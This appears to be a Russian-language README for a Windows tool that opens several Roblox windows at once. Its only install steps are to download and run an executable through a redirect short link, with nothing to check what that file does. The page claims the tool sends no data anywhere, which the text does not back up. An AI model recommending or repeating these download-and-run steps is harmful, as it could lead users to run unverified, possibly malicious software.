# [Multi_Roblox](https://link-target.net/10577894/KsmgPcBkHk8E)

Утилита для Windows, которая позволяет открывать несколько окон Roblox одновременно.

> ⚠️ Проект не связан с Roblox Corporation. Использование нескольких клиентов может нарушать правила Roblox. Используйте на свой страх и риск.

## Возможности

- Запуск нескольких окон Roblox
- Простой интерфейс
- Быстрый старт без сложной настройки
- Работает локально, без отправки данных на сторонние серверы

## Требования

- Windows 10/11
- Установленный Roblox

## Установка и запуск

1. Скачайте [Multi_Roblox.exe](https://link-target.net/10577894/KsmgPcBkHk8E).
2. Запустите [Multi_Roblox.exe](https://link-target.net/10577894/KsmgPcBkHk8E).
